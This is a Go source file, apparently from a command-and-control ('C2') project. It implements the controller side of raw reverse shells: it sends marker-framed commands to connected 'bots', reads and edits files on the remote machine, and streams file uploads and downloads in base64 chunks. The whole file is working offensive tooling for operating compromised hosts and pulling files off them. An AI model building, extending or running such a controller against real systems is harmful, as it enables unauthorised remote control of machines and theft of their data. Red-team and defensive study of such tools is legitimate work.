package shell

import (
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"c2agent/internal/agent"
)

const (
	// shutdownGrace bounds how long Backend.Shutdown waits for the controlled
	// end to close the socket on its own before the C2 forces it shut.
	shutdownGrace = 1 * time.Second
	// maxDrainLineBuf caps the partial-line buffer while a timed-out command is
	// being drained: its content is discarded anyway, so a runaway command
	// cannot grow memory without bound.
	maxDrainLineBuf = 32 * 1024
)

type shellResult struct {
	out string
	err error
}

type pendingReq struct {
	lastCommand string
	marker      string
	raw         bool
	lines       []string
	ch          chan shellResult
	// draining is set once the request times out: the command is still
	// running, so its remaining output is discarded (not buffered) while the
	// reader waits for the marker to resynchronize.
	draining bool
}

// Backend drives one raw reverse shell using the echo-marker framing.
type Backend struct {
	id      string
	conn    net.Conn
	writeMu *sync.Mutex
	osName  string
	envName string

	mu      sync.Mutex
	pending *pendingReq
	lineBuf string

	closed chan struct{}
}

func newBackend(id string, conn net.Conn) *Backend {
	return &Backend{id: id, conn: conn, writeMu: &sync.Mutex{}, closed: make(chan struct{})}
}

func (b *Backend) setOS(os string)   { b.osName = os }
func (b *Backend) setEnv(env string) { b.envName = env }

// target is the (OS, interpreter) pair used to generate commands.
func (b *Backend) target() target { return target{os: b.osName, env: b.envName} }

func (b *Backend) isWindows() bool { return b.osName == "Windows" }

func (b *Backend) write(p []byte) error {
	b.writeMu.Lock()
	defer b.writeMu.Unlock()
	_, err := b.conn.Write(p)
	return err
}

// request sends one single-line command and waits for the marker-delimited
// reply. Queue/exec timeout is provided by the caller's context.
func (b *Backend) request(ctx context.Context, command string) (string, error) {
	return b.requestMode(ctx, command, false)
}

// requestRaw is like request but preserves the reply verbatim: only the marker
// framing and the echoed command line are removed. It is used for file reads,
// whose content must not be mangled by the prompt/blank-line heuristics in
// stripShellResponse.
func (b *Backend) requestRaw(ctx context.Context, command string) (string, error) {
	return b.requestMode(ctx, command, true)
}

func (b *Backend) requestMode(ctx context.Context, command string, raw bool) (string, error) {
	command = oneLine(command)
	marker := randMarker()
	p := &pendingReq{marker: marker, lastCommand: command, raw: raw, ch: make(chan shellResult, 1)}

	b.mu.Lock()
	if b.pending != nil {
		b.mu.Unlock()
		// A previous command timed out and is still running (its marker has not
		// arrived); refuse to write a new command into the middle of it.
		return "", agent.ErrAgentBusy
	}
	b.pending = p
	b.lineBuf = ""
	b.mu.Unlock()

	payload := command + "\necho " + marker + "\n"
	if err := b.write([]byte(payload)); err != nil {
		b.clearPending(p)
		return "", agent.NewNetworkError("send: %v", err)
	}

	select {
	case r := <-p.ch:
		return r.out, r.err
	case <-ctx.Done():
		if errors.Is(ctx.Err(), context.DeadlineExceeded) {
			// Execution timeout. Leave the request pending and the connection
			// open: the command may still be running, so its late output must
			// not be attributed to a later request. Busy() now reports true, so
			// no further command is written until the marker arrives; the
			// dispatcher decides whether to disconnect or keep waiting
			// (timeout_action).
			b.markDraining(p)
			return "", ctx.Err()
		}
		// Cancelled (session stop / agent close): the command may still be
		// running and its late output must never be attributed to a later
		// request, so give up on this request and drop the connection.
		b.abortRequest(p)
		return "", ctx.Err()
	}
}

// markDraining flags a timed-out request so its remaining output is discarded
// (only the marker is sought) and drops any content buffered so far.
func (b *Backend) markDraining(p *pendingReq) {
	b.mu.Lock()
	if b.pending == p {
		p.draining = true
		p.lines = nil
	}
	b.mu.Unlock()
}

// Busy reports whether a request is still outstanding (e.g. a command that
// timed out but has not finished). Implements agent.BusyReporter.
func (b *Backend) Busy() bool {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.pending != nil
}

// abortRequest clears the pending request and drops the connection: a
// timed-out command may still be running, so its late output must never be
// attributed to a later request, and the bot is re-established on reconnect.
func (b *Backend) abortRequest(p *pendingReq) {
	b.mu.Lock()
	if b.pending == p {
		b.pending = nil
	}
	b.mu.Unlock()
	_ = b.conn.Close()
}

func (b *Backend) clearPending(p *pendingReq) {
	b.mu.Lock()
	if b.pending == p {
		b.pending = nil
	}
	b.mu.Unlock()
}

func (b *Backend) failPending(err error) {
	b.mu.Lock()
	p := b.pending
	b.pending = nil
	b.mu.Unlock()
	if p != nil {
		select {
		case p.ch <- shellResult{err: agent.NewNetworkError("connection lost: %v", err)}:
		default:
		}
	}
}

func (b *Backend) readLoop() {
	defer close(b.closed)
	buf := make([]byte, 4096)
	for {
		n, err := b.conn.Read(buf)
		if n > 0 {
			b.handleData(string(buf[:n]))
		}
		if err != nil {
			b.failPending(err)
			return
		}
	}
}

func (b *Backend) handleData(data string) {
	b.mu.Lock()
	defer b.mu.Unlock()
	b.lineBuf += data
	for {
		idx := strings.IndexByte(b.lineBuf, '\n')
		if idx < 0 {
			// While draining, bound the partial-line buffer: a line longer than
			// the cap cannot be the (short) marker, so drop it instead of
			// letting a runaway command grow memory. The normal path keeps full
			// lines (Windows read_file returns one long base64 line).
			if b.pending != nil && b.pending.draining && len(b.lineBuf) > maxDrainLineBuf {
				b.lineBuf = ""
			}
			return
		}
		line := strings.TrimRight(b.lineBuf[:idx], "\r")
		b.lineBuf = b.lineBuf[idx+1:]
		if b.pending != nil && line == b.pending.marker {
			p := b.pending
			b.pending = nil
			var out string
			if p.raw {
				out = stripFileResponse(p.lines, p.marker, p.lastCommand)
			} else {
				out = stripShellResponse(p.lines, p.marker, p.lastCommand)
			}
			select {
			case p.ch <- shellResult{out: out}:
			default:
			}
			b.lineBuf = ""
			continue
		}
		if b.pending != nil && !b.pending.draining {
			b.pending.lines = append(b.pending.lines, line)
		}
	}
}

// Execute implements agent.Backend.
func (b *Backend) Execute(ctx context.Context, action string, params map[string]any) (string, error) {
	if action == "edit_file" {
		return b.editFile(ctx, params)
	}
	cmd, err := actionToShell(action, params, b.target())
	if err != nil {
		return "Error: " + err.Error(), nil
	}
	if strings.TrimSpace(cmd) == "" {
		return "Error: empty shell command", nil
	}
	var out string
	switch {
	case action == "read_file" && b.isWindows():
		// Windows read commands return base64, which never looks like a shell
		// prompt, so the prompt/echo-stripping path is safe and more robust.
		out, err = b.request(ctx, cmd)
	case action == "read_file":
		// POSIX reads return raw file content; preserve it verbatim.
		out, err = b.requestRaw(ctx, cmd)
	default:
		out, err = b.request(ctx, cmd)
	}
	if err != nil {
		return "", err
	}
	switch action {
	case "list_dir":
		out = formatListing(out)
	case "read_file":
		if b.isWindows() {
			content, perr := extractWrappedEdit(out, winReadBegin, winReadEnd, winReadMissing)
			if perr != "" {
				return "Error: read failed: " + perr, nil
			}
			out = content
		}
		if isWholeFileRead(params) {
			// Match the native agents: whole-file reads are capped at 51200 chars.
			out = truncateRunes(out, 51200)
		} else if b.isWindows() {
			// Line ranges are sliced on the control end so original newlines
			// are preserved (PowerShell's ReadLines/AppendLine would rewrite them).
			out = sliceLines(out, paramString(params["start_line"]), paramString(params["end_line"]))
		}
	}
	return out, nil
}

// Upload streams a local file to destPath in fixed-size chunks. The control end
// drives the offset loop (read a local chunk -> base64 -> one append command),
// so the shell bot's memory is bounded regardless of file size. The file is
// written to a temporary remote path and renamed into place only after the size
// is verified, so a failed transfer never leaves a partially written destination.
func (b *Backend) Upload(ctx context.Context, localPath, destPath string) (string, error) {
	info, err := os.Stat(localPath)
	if err != nil || info.IsDir() {
		return "Error: local file not found: " + localPath, nil
	}
	f, err := os.Open(localPath)
	if err != nil {
		return "Error: cannot open local file: " + err.Error(), nil
	}
	defer f.Close()

	base := agent.BaseName(destPath)
	tmpPath := remoteJoin(remoteParent(destPath), base+".c2part-"+randToken(), b.target())
	createCmd, err := truncateCreateCmd(b.target(), tmpPath)
	if err != nil {
		return "Error: " + err.Error(), nil
	}
	if _, err := b.request(ctx, createCmd); err != nil {
		return "", err
	}

	chunk := b.target().transferChunkSize()
	buf := make([]byte, chunk)
	total := int64(0)
	for {
		if cerr := ctx.Err(); cerr != nil {
			b.removeRemote(tmpPath)
			return "", cerr
		}
		n, rerr := f.Read(buf)
		if n > 0 {
			b64 := base64.StdEncoding.EncodeToString(buf[:n])
			appendCmd, aerr := appendBase64Cmd(b.target(), tmpPath, b64)
			if aerr != nil {
				b.removeRemote(tmpPath)
				return "Error: " + aerr.Error(), nil
			}
			if _, werr := b.request(ctx, appendCmd); werr != nil {
				b.removeRemote(tmpPath)
				return "", werr
			}
			total += int64(n)
		}
		if rerr == io.EOF {
			break
		}
		if rerr != nil {
			b.removeRemote(tmpPath)
			return "", rerr
		}
	}

	if !b.verifyRemoteSize(ctx, tmpPath, total) {
		b.removeRemote(tmpPath)
		return "Error: upload verification failed", nil
	}
	renCmd, err := renameCmd(b.target(), tmpPath, base)
	if err != nil {
		b.removeRemote(tmpPath)
		return "Error: " + err.Error(), nil
	}
	if _, err := b.request(ctx, renCmd); err != nil {
		b.removeRemote(tmpPath)
		return "", err
	}
	return fmt.Sprintf("Successfully uploaded: %s (%d bytes)", destPath, total), nil
}

// Download streams <srcPath> into <destDir>/<basename(srcPath)>. The control end
// drives the offset loop (one read command per chunk), so the shell bot's memory
// is bounded regardless of file size; the local file is written to a temporary
// path and renamed into place after the size is verified.
func (b *Backend) Download(ctx context.Context, srcPath, destDir string) (string, error) {
	size, msg, err := b.remoteFileSize(ctx, srcPath)
	if err != nil {
		return "", err
	}
	if msg != "" {
		// A non-numeric size is a business failure (missing/unreadable source),
		// not a transport error; report it without classifying it as network.
		return "", fmt.Errorf("download %s: %s", srcPath, msg)
	}
	if size < 0 {
		size = 0
	}

	dest := filepath.Join(destDir, agent.BaseName(srcPath))
	tmp := dest + ".c2part-" + randToken()
	f, err := os.Create(tmp)
	if err != nil {
		return "", err
	}
	cleanup := func() {
		f.Close()
		_ = os.Remove(tmp)
	}

	chunk := int64(b.target().readChunkSize())
	read := int64(0)
	for read < size {
		if cerr := ctx.Err(); cerr != nil {
			cleanup()
			return "", cerr
		}
		n := chunk
		if size-read < n {
			n = size - read
		}
		chunkCmd, cerr := readChunkCmd(b.target(), srcPath, read, n)
		if cerr != nil {
			cleanup()
			return "", agent.NewNetworkError("%v", cerr)
		}
		// base64 output has no prompt-like lines, so the prompt/echo-stripping
		// `request` is used instead of the verbatim `requestRaw`.
		chunkOut, rerr := b.request(ctx, chunkCmd)
		if rerr != nil {
			cleanup()
			return "", rerr
		}
		payload := chunkOut
		if b.isWindows() {
			p, perr := extractWrappedText(chunkOut, winChunkBegin, winChunkEnd, winChunkMissing)
			if perr != "" {
				cleanup()
				return "", agent.NewNetworkError("download: bad chunk at offset %d", read)
			}
			payload = p
		}
		data, ok := decodeBase64(payload)
		if !ok || int64(len(data)) != n {
			cleanup()
			return "", agent.NewNetworkError("download: bad chunk at offset %d", read)
		}
		if _, werr := f.Write(data); werr != nil {
			cleanup()
			return "", werr
		}
		read += n
	}
	if err := f.Close(); err != nil {
		_ = os.Remove(tmp)
		return "", err
	}
	if err := os.Rename(tmp, dest); err != nil {
		_ = os.Remove(tmp)
		return "", err
	}
	return dest, nil
}

// remoteFileSize runs the size command and parses the reply. On Windows the
// reply is sentinel-framed, so only the payload between the sentinels is
// parsed and surrounding stream noise (e.g. a PowerShell CLIXML block on a
// merged stderr) is ignored. It returns the size, a business-error message
// ("" on success), and a transport error.
func (b *Backend) remoteFileSize(ctx context.Context, path string) (int64, string, error) {
	sizeCmd, err := fileSizeCmd(b.target(), path)
	if err != nil {
		return 0, "", agent.NewNetworkError("%v", err)
	}
	out, err := b.request(ctx, sizeCmd)
	if err != nil {
		return 0, "", err
	}
	text := strings.TrimSpace(out)
	if b.isWindows() {
		payload, perr := extractWrappedText(out, winSizeBegin, winSizeEnd, winSizeMissing)
		if perr != "" {
			return 0, perr, nil
		}
		text = payload
	}
	size, perr := strconv.ParseInt(text, 10, 64)
	if perr != nil {
		if text == "" {
			text = "cannot stat source"
		}
		return 0, text, nil
	}
	return size, "", nil
}

// verifyRemoteSize reports whether the remote file now has exactly want bytes.
func (b *Backend) verifyRemoteSize(ctx context.Context, path string, want int64) bool {
	size, msg, err := b.remoteFileSize(ctx, path)
	return err == nil && msg == "" && size == want
}

// removeRemote best-effort deletes a remote temporary file.
func (b *Backend) removeRemote(path string) {
	cmd, err := removeCmd(b.target(), path)
	if err != nil {
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	_, _ = b.request(ctx, cmd)
}

// Shutdown closes the shell by sending "exit", then waits briefly for the
// controlled end to close the socket. If it does not (e.g. a wedged shell or a
// command eating the input), the C2 forces the connection shut so a dead
// connection cannot linger in the registry forever.
func (b *Backend) Shutdown(ctx context.Context) error {
	if err := b.write([]byte("exit\n")); err != nil {
		return err
	}
	select {
	case <-b.closed:
	case <-time.After(shutdownGrace):
		_ = b.conn.Close()
	}
	return nil
}

// Close closes the underlying connection.
func (b *Backend) Close() error { return b.conn.Close() }

func (b *Backend) editFile(ctx context.Context, params map[string]any) (string, error) {
	path := paramString(params["path"])
	if path == "" {
		return "Error: missing path", nil
	}
	limit := maxEditBytes(b.target())
	begin := randSentinel("B")
	end := randSentinel("E")
	missing := randSentinel("M")
	// Read one byte past the writable limit so a file that is too large to
	// rewrite is detected before we attempt (and fail) the write.
	readCmd, err := readFileWrappedCmd(b.target(), path, begin, end, missing, limit+1)
	if err != nil {
		return "Error: " + err.Error(), nil
	}
	out, err := b.requestRaw(ctx, readCmd)
	if err != nil {
		return "", err
	}
	content, perr := extractWrappedEdit(out, begin, end, missing)
	if perr != "" {
		return "Error: " + perr, nil
	}
	if len(content) > limit {
		return "Error: file too large for a shell bot; use a native agent", nil
	}
	edited, editErr := applyStringEdit(content,
		paramString(params["old_text"]),
		paramString(params["new_text"]))
	if editErr != "" {
		return "Error: " + editErr, nil
	}
	// Write to a temporary sibling, then rename into place, so a failed write
	// never truncates the original file.
	base := agent.BaseName(path)
	tmpPath := remoteJoin(remoteParent(path), base+".c2part-"+randToken(), b.target())
	b64 := base64.StdEncoding.EncodeToString([]byte(edited))
	writeCmd, err := writeBase64Cmd(b.target(), tmpPath, b64)
	if err != nil {
		return "Error: " + err.Error(), nil
	}
	if _, err := b.request(ctx, writeCmd); err != nil {
		b.removeRemote(tmpPath)
		return "", err
	}
	renCmd, rerr := renameCmd(b.target(), tmpPath, base)
	if rerr != nil {
		b.removeRemote(tmpPath)
		return "Error: " + rerr.Error(), nil
	}
	if _, err := b.request(ctx, renCmd); err != nil {
		b.removeRemote(tmpPath)
		return "", err
	}
	// A shell command's failure is not a transport error, so verify the end
	// state: the destination must now be exactly the size we wrote.
	if !b.verifyRemoteSize(ctx, path, int64(len(edited))) {
		return "Error: edit verification failed", nil
	}
	return "Successfully edited file: " + path, nil
}

// extractWrappedText returns the payload framed by begin/end, ignoring any
// surrounding stream noise. A lone `missing` line is reported as an error.
func extractWrappedText(out, begin, end, missing string) (string, string) {
	lines := strings.Split(out, "\n")
	for _, l := range lines {
		if strings.TrimSpace(l) == missing {
			return "", "file not found, not readable, or not a regular file"
		}
	}
	bi := -1
	for i, l := range lines {
		if strings.TrimSpace(l) == begin {
			bi = i
			break
		}
	}
	if bi < 0 {
		return "", "unexpected response while reading file"
	}
	ei := -1
	for i := bi + 1; i < len(lines); i++ {
		if strings.TrimSpace(lines[i]) == end {
			ei = i
			break
		}
	}
	if ei < 0 {
		return "", "unexpected response while reading file"
	}
	return strings.TrimSpace(strings.Join(lines[bi+1:ei], "\n")), ""
}

// extractWrappedEdit pulls the base64 payload out of a sentinel-wrapped read,
// returning the decoded content and an error message ("" on success). Because
// the payload is framed and verified by base64 decoding, file content that
// happens to look like an error message is never misread as a read failure.
func extractWrappedEdit(out, begin, end, missing string) (string, string) {
	payload, perr := extractWrappedText(out, begin, end, missing)
	if perr != "" {
		return "", perr
	}
	data, ok := decodeBase64(payload)
	if !ok {
		return "", "could not decode file content"
	}
	return string(data), ""
}
